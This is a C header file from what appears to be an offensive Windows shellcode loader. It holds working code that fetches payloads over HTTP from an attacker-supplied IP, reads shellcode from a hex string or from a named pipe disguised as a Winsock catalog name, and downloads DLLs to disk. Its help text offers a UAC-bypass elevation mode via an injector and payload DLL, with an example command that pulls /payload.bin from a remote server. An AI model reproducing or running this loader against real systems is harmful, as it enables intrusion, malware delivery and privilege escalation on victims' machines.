#pragma once
#include "core.h"
#include <stdio.h>
#include <string.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

enum MethodType { METHOD_NAMEDPIPE, METHOD_HEXSHELLCODE, METHOD_RESSOURCE, METHOD_HTTP };
enum MethodType selected_method = METHOD_RESSOURCE;

const char* hexstr;
int elevate = 0;             // Flag for UAC bypass
int reuse_http = 0;          // Flag to reuse IP/port for elevate
const char* server_ip = NULL;
int server_port = 0;
const char* tapi32_manifest = NULL;
const char* injector_dll = NULL;
const char* payload_dll = NULL;

int http_get_payload(const char* ip, int port, const char* path) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    DWORD dwBytesRead = 0;
    char tempBuffer[4096];

    hInternet = InternetOpen(L"SimpleParser/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("[-] InternetOpen failed\n");
        return -1;
    }

    wchar_t wideIP[256];
    MultiByteToWideChar(CP_ACP, 0, ip, -1, wideIP, sizeof(wideIP) / sizeof(wideIP[0]));

    hConnect = InternetConnect(hInternet, wideIP, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("[-] InternetConnect failed\n");
        InternetCloseHandle(hInternet);
        return -1;
    }

    wchar_t widePath[512];
    MultiByteToWideChar(CP_ACP, 0, path, -1, widePath, sizeof(widePath) / sizeof(widePath[0]));

    hRequest = HttpOpenRequest(hConnect, L"GET", widePath, NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        printf("[-] HttpOpenRequest failed\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return -1;
    }

    if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        DWORD error = GetLastError();
        printf("[-] HttpSendRequest failed with error: %d\n", error);
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return -1;
    }

    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    if (HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &dwStatusCode, &dwSize, NULL)) {
        if (dwStatusCode != 200) {
            printf("[-] HTTP error: %d\n", dwStatusCode);
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return -1;
        }
    }

    size = 0;

    while (InternetReadFile(hRequest, tempBuffer, sizeof(tempBuffer), &dwBytesRead) && dwBytesRead > 0) {
        if (size + dwBytesRead > sizeof(buffer)) {
            dwBytesRead = sizeof(buffer) - size;
            if (dwBytesRead <= 0) break;
        }

        memcpy(buffer + size, tempBuffer, dwBytesRead);
        size += dwBytesRead;

        if (size >= sizeof(buffer)) {
            printf("[!] Warning: Buffer full, truncating response\n");
            break;
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    printf("[+] Successfully retrieved %d bytes\n", size);
    return 0;
}

// Alternative raw socket implementation (avoids WinINet issues)
int http_get_payload_raw(const char* ip, int port, const char* path) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;
    char request[512];
    char recvbuf[8192];
    int bytesReceived;
    int totalReceived = 0;
    char* body_start = NULL;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] WSAStartup failed\n");
        return -1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] Socket creation failed\n");
        WSACleanup();
        return -1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons((u_short)port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (server.sin_addr.s_addr == INADDR_NONE) {
        printf("[-] Invalid IP address\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[-] Connection to %s:%d failed\n", ip, port);
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "User-Agent: SimpleParser/1.0\r\n"
        "\r\n",
        path, ip);

    if (send(sock, request, (int)strlen(request), 0) == SOCKET_ERROR) {
        printf("[-] Failed to send request\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    memset(recvbuf, 0, sizeof(recvbuf));
    while ((bytesReceived = recv(sock, recvbuf + totalReceived,
        sizeof(recvbuf) - totalReceived - 1, 0)) > 0) {
        totalReceived += bytesReceived;
        if (totalReceived >= sizeof(recvbuf) - 1) break;
    }

    if (totalReceived <= 0) {
        printf("[-] Failed to receive data\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    body_start = strstr(recvbuf, "\r\n\r\n");
    if (!body_start) {
        printf("[-] Could not find HTTP headers end\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    body_start += 4;
    size = totalReceived - (DWORD)(body_start - recvbuf);

    if (size > sizeof(buffer)) {
        printf("[!] Warning: Body size (%d) exceeds buffer size, truncating\n", size);
        size = sizeof(buffer);
    }

    memcpy(buffer, body_start, size);

    closesocket(sock);
    WSACleanup();

    printf("[+] Successfully retrieved %d bytes\n", size);
    return 0;
}

// Download file and save to disk
int http_download_file(const char* ip, int port, const char* path, const char* local_file) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;
    char request[512];
    char recvbuf[8192];
    int bytesReceived;
    int totalReceived = 0;
    char* body_start = NULL;
    FILE* file = NULL;
    DWORD body_size = 0;

    printf("[+] Downloading %s:%d/%s to %s\n", ip, port, path, local_file);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] WSAStartup failed\n");
        return -1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] Socket creation failed\n");
        WSACleanup();
        return -1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons((u_short)port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (server.sin_addr.s_addr == INADDR_NONE) {
        printf("[-] Invalid IP address\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[-] Connection to %s:%d failed\n", ip, port);
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "User-Agent: SimpleParser/1.0\r\n"
        "\r\n",
        path, ip);

    if (send(sock, request, (int)strlen(request), 0) == SOCKET_ERROR) {
        printf("[-] Failed to send request\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    // Open file for writing in binary mode
    if (fopen_s(&file, local_file, "wb") != 0) {
        printf("[-] Failed to create file: %s\n", local_file);
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    // Receive headers first
    memset(recvbuf, 0, sizeof(recvbuf));
    while ((bytesReceived = recv(sock, recvbuf + totalReceived,
        sizeof(recvbuf) - totalReceived - 1, 0)) > 0) {
        totalReceived += bytesReceived;
        if (totalReceived >= sizeof(recvbuf) - 1) break;

        // Check if we have complete headers
        if (strstr(recvbuf, "\r\n\r\n")) {
            break;
        }
    }

    if (totalReceived <= 0) {
        printf("[-] Failed to receive headers\n");
        fclose(file);
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    // Find body start
    body_start = strstr(recvbuf, "\r\n\r\n");
    if (!body_start) {
        printf("[-] Could not find HTTP headers end\n");
        fclose(file);
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    body_start += 4;
    body_size = totalReceived - (DWORD)(body_start - recvbuf);

    // Write initial body data to file
    if (body_size > 0) {
        fwrite(body_start, 1, body_size, file);
    }

    // Continue receiving and writing directly to file
    DWORD total_written = body_size;
    while ((bytesReceived = recv(sock, recvbuf, sizeof(recvbuf), 0)) > 0) {
        fwrite(recvbuf, 1, bytesReceived, file);
        total_written += bytesReceived;
    }

    fclose(file);
    closesocket(sock);
    WSACleanup();

    printf("[+] Successfully downloaded %d bytes to %s\n", total_written, local_file);
    return 0;
}

int hexstr_to_global_buffer(const char* hexstr) {
    size = (DWORD)(strlen(hexstr) / 2);
    if (size > sizeof(buffer)) {
        printf("[-] Hex string too large for buffer!\n");
        return -1;
    }

    for (DWORD i = 0; i < size; i++) {
        char byteStr[3] = { hexstr[i * 2], hexstr[i * 2 + 1], 0 };
        buffer[i] = (BYTE)strtoul(byteStr, NULL, 16);
    }
    printf("[+] Successfully decoded hex To the buffer with size=%d\n", size);
    return 0;
}
void PipeReader() {
    // Initialize the APIs
    printf("[*] Initializing APIs...\n");
    InitAPIs(&api,debug);

    char pipeName[128];
    snprintf(pipeName, sizeof(pipeName),
        "\\\\.\\pipe\\Winsock2\\CatalogChangeListener-3ac-0-0x%x", 0x1337);

    printf("[*] Connecting to server pipe...\n");

    HANDLE hPipe = api.pCreateFileA(
        pipeName,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to connect to pipe: %d\n", api.pGetLastError());
        return;
    }

    printf("[+] Connected to pipe: %s\n", pipeName);

    if (api.pReadFile(hPipe, buffer, sizeof(buffer), &size, NULL) && size > 0) {
        printf("[*] Received %lu bytes\n", size);

    }
    else {
        printf("[-] Failed to read from pipe or no data.\n");
    }

    if (api.pGetLastError() != ERROR_BROKEN_PIPE && api.pGetLastError() != 0 ) {
        printf("[-] Read error: %d\n", api.pGetLastError());
    } else {
        printf("[+] Pipe closed by server.\n");
    }
	api.pCloseHandle(hPipe);

}

int _stricmp(const char* a, const char* b) {
    for (; *a && *b; a++, b++) {
        if (tolower(*a) != tolower(*b)) return tolower(*a) - tolower(*b);
    }
    return *a - *b;
}

void print_help(const char* prog_name) {
    printf("\n=== %s Help ===\n\n", prog_name);
    printf("Usage:\n");
    printf("  %s [-m|--method] <method> [--hex <hexstring>] [-i <ip> -p <port> -f <file>]\n", prog_name);
    printf("       [--elevate [--server-ip <ip> --server-port <port>] --reuse\n");
    printf("        --tapi32-manifest <file> --injector <dll> --payload <dll>]\n\n");

    printf("Available methods:\n");
    printf("  namedpipe   Use Named Pipe method\n");
    printf("  hex         Provide shellcode as hex string\n");
    printf("  resource    Use embedded resource (default)\n");
    printf("  http        Fetch payload over HTTP\n\n");

    printf("Options:\n");
    printf("  -h, --help             Show this help message\n");
    printf("  -m, --method <method>  Select payload retrieval method\n");
    printf("  --hex <hexstr>          Hex string for hex method\n");
    printf("  -i <ip>                 IP address for HTTP method\n");
    printf("  -p <port>               Port for HTTP method\n");
    printf("  -f <file>               File path on server for HTTP method\n");
    printf("  --elevate               Attempt UAC bypass using CVE-2024-6979\n");
    printf("    --server-ip <ip>      Server IP for DLLs (optional, used with --reuse)\n");
    printf("    --server-port <port>  Server port for DLLs (optional, used with --reuse)\n");
    printf("    --reuse               Reuse HTTP IP/Port for elevation (only works with HTTP method)\n");
    printf("    --tapi32-manifest <file>  TAPI32.Manifest for elevation\n");
    printf("    --injector <dll>          Injector DLL (e.g., MsCtfMonitor.dll)\n");
    printf("    --payload <dll>           Payload DLL (e.g., imm32.dll)\n\n");

    printf("Notes:\n");
    printf("  - Hex method cannot be used with elevate due to size limits of Donut-generated shellcode.\n");
    printf("  - Elevate will pull DLLs from remote server if IP and port are specified.\n\n");

    printf("Example usage:\n");
    printf("  %s -m http -i 10.10.10.10 -p 80 -f /payload.bin --elevate --reuse --tapi32-manifest TAPI32.Manifest --injector MsCtfMonitor.dll --payload imm32.dll\n\n", prog_name);
}

void arg_parser(int argc, char* argv[]) {
    if (argc == 1) return; // default behavior

    const char* http_ip = NULL;
    int http_port = 0;
    const char* http_file = NULL;

    for (int i = 1; i < argc; i++) {
        if (_stricmp(argv[i], "-h") == 0 || _stricmp(argv[i], "--help") == 0) {
            print_help(argv[0]);
            exit(EXIT_SUCCESS);
        }

        // --- Method parsing ---
        if ((_stricmp(argv[i], "-m") == 0 || _stricmp(argv[i], "--method") == 0) && i + 1 < argc) {
            char* method = argv[i + 1];

            if (_stricmp(method, "namedpipe") == 0) {
                selected_method = METHOD_NAMEDPIPE;
                printf("[+] Selected method: namedpipe\n");
                i++;
            }
            else if (_stricmp(method, "hex") == 0) {
                selected_method = METHOD_HEXSHELLCODE;
                printf("[+] Selected method: hex shellcode\n");
                if (i + 3 < argc && _stricmp(argv[i + 2], "--hex") == 0) {
                    hexstr = argv[i + 3];
                    if (hexstr_to_global_buffer(hexstr) != 0) exit(EXIT_FAILURE);
                    i += 3;
                }
                else {
                    printf("[-] Missing --hex <hexstring>\n");
                    exit(EXIT_FAILURE);
                }
            }
            else if (_stricmp(method, "resource") == 0) {
                selected_method = METHOD_RESSOURCE;
                printf("[+] Selected method: resource\n");
                i++;
            }
            else if (_stricmp(method, "http") == 0) {
                selected_method = METHOD_HTTP;
                if (i + 6 < argc &&
                    _stricmp(argv[i + 2], "-i") == 0 &&
                    _stricmp(argv[i + 4], "-p") == 0 &&
                    _stricmp(argv[i + 6], "-f") == 0)
                {
                    http_ip = argv[i + 3];
                    http_port = atoi(argv[i + 5]);
                    http_file = argv[i + 7];
                    printf("[+] Selected method: HTTP\n");
                    printf("    IP: %s, Port: %d, File: %s\n", http_ip, http_port, http_file);

                    // Get the HTTP payload
                    if (http_get_payload(http_ip, http_port, http_file) != 0) exit(EXIT_FAILURE);
                    i += 7;
                }
                else {
                    printf("[-] Missing -i <ip> -p <port> -f <file>\n");
                    exit(EXIT_FAILURE);
                }
            }
            else {
                printf("[-] Unknown method: %s\n", method);
                exit(EXIT_FAILURE);
            }
        }

        // --- Elevate parsing ---
        if (_stricmp(argv[i], "--elevate") == 0) {
            elevate = 1;
            printf("[+] UAC bypass elevation enabled\n");

            for (int j = i + 1; j < argc; j++) {
                if (_stricmp(argv[j], "--server-ip") == 0 && j + 1 < argc) {
                    server_ip = argv[j + 1];
                    j++;
                }
                else if (_stricmp(argv[j], "--server-port") == 0 && j + 1 < argc) {
                    server_port = atoi(argv[j + 1]);
                    j++;
                }
                else if (_stricmp(argv[j], "--reuse") == 0) {
                    if (selected_method != METHOD_HTTP) {
                        printf("[-] --reuse can only be used with HTTP method\n");
                        exit(EXIT_FAILURE);
                    }
                    reuse_http = 1;
                    if (!server_ip) server_ip = http_ip;
                    if (!server_port) server_port = http_port;
                    printf("[+] Reusing HTTP IP/Port for elevation: %s:%d\n", server_ip, server_port);
                }
                else if (_stricmp(argv[j], "--tapi32-manifest") == 0 && j + 1 < argc) {
                    tapi32_manifest = argv[j + 1];
                    j++;
                }
                else if (_stricmp(argv[j], "--injector") == 0 && j + 1 < argc) {
                    injector_dll = argv[j + 1];
                    j++;
                }
                else if (_stricmp(argv[j], "--payload") == 0 && j + 1 < argc) {
                    payload_dll = argv[j + 1];
                    j++;
                }
                else break;
            }

            // Check mandatory elevation parameters
            if (!tapi32_manifest || !injector_dll || !payload_dll) {
                printf("[-] Elevate requires --tapi32-manifest, --injector, and --payload\n");
                exit(EXIT_FAILURE);
            }
        }
    }
}
